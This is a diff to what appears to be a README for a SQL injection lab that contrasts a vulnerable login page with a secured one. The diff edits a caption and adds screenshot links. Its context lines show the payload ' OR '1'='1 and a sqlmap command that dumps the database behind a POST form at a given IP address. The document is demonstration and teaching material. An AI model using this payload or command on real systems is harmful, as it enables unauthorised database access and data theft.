@@ -29,14 +29,15 @@ The goal is to showcase how SQL Injection can be exploited and then mitigated us
 ' OR '1'='1
 sqlmap -u "http://3.87.88.51/page1.php" --data="username=test*&password=test" --method=POST --dbms=mysql --technique=B --batch --dump
 ```
-✅ Should log in (bypasses authentication).
+✅ SQL injection testing (bypasses authentication).
 
 <img width="1505" height="385" alt="Screenshot 2025-09-09 at 8 28 53 AM" src="https://github.com/user-attachments/assets/085306e7-4817-49d4-8fc5-422c73035db3" />
 
 <img width="1503" height="269" alt="Screenshot 2025-09-09 at 8 36 25 AM" src="https://github.com/user-attachments/assets/f9dcf707-45c9-4297-8a19-d59cdcef239e" />
 
+<img width="1512" height="982" alt="Screenshot 2025-09-09 at 8 14 45 AM" src="https://github.com/user-attachments/assets/761052c4-3a01-4065-a672-75cd37b2385e" />
 
-
+<img width="1512" height="982" alt="Screenshot 2025-09-09 at 8 14 54 AM" src="https://github.com/user-attachments/assets/0685bb67-7c0f-4659-9fc7-6758c493e025" />
 
 ### Secured Page
 - URL: `http://3.87.88.51/page2.html`  
